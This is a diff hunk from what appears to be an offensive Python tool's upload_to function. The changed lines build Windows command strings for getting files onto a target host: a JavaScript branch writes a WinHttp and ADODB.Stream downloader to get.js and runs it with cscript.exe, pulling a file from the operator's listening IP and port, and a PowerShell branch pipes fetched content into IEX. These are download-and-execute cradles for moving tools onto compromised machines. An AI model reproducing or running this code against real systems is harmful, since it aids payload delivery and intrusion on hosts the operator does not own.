@@ -389,15 +389,16 @@ def upload_to(args):
                 endcmd = ' | IEX'
             elif choice == 'JavaScript':
                 print('[+] JavaScript method selected')
-                cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\''
-                cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\''
-                cmd += '\$file = \'WinHttpReq.Send();\''
-                cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\''
-                cmd += '\$file = \'BinStream.Type = 1;\''
-                cmd += '\$file = \'BinStream.Open();\''
-                cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\''
-                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
-                cmd += '\$file | Out-File http:/' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
+                cmd = '\$file = \'var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");\'\n'
+                cmd += '\$file = \'WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);\'\n'
+                cmd += '\$file = \'WinHttpReq.Send();\'\n'
+                cmd += '\$file = \'BinStream = new ActiveXObject("ADODB.Stream");\'\n'
+                cmd += '\$file = \'BinStream.Type = 1;\'\n'
+                cmd += '\$file = \'BinStream.Open();\'\n'
+                cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
+                cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\'\n'
+                cmd += '\$file | Out-File get.js;'
+                cmd += 'cscript.exe /nologo get.js http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
 
             else:
                 print('[!] Invalid choice')
